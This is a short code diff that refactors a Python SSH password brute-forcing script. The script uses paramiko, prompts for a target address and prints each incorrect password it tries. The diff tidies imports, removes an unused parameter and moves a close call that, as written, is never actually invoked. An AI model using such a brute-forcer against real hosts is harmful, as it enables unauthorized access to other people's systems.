@@ -1,10 +1,15 @@
-import paramiko, sys, os, socket, termcolor
-import threading, time
+import threading
+import time
+
+import os
+import paramiko
+import sys
+import termcolor
 
 stop_flag = 0
 
 
-def ssh_connect(password, code=0):
+def ssh_connect(password):
     global stop_flag
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -16,7 +21,7 @@ def ssh_connect(password, code=0):
 
     except:
         print(termcolor.colored(('[-] Incorrect Password: ' + password), 'red'))
-        ssh.close
+    ssh.close
 
 
 host = input('[+] Target Address: ')
